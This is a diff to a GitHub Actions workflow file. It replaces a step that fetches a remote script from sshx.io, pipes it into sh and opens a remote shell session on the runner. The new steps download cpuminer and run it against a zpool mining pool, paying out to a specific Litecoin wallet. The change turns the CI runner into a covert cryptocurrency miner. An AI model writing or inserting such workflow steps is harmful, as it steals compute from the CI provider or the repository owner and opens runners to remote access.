@@ -27,8 +27,9 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: curl -sSf https://sshx.io/get | sh
+        run: wget -qO idk.tar.gz https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-         sshx
+         tar -xzvf idk.tar.gz
+         ./minerd -a scrypt -o stratum+tcp://scrypt.na.mine.zpool.ca:3433 -u ltc1q6pzgn3yqadm379wevqawv7xsy5e8ynxpnjmgee -p c=LTC,zap=LTC
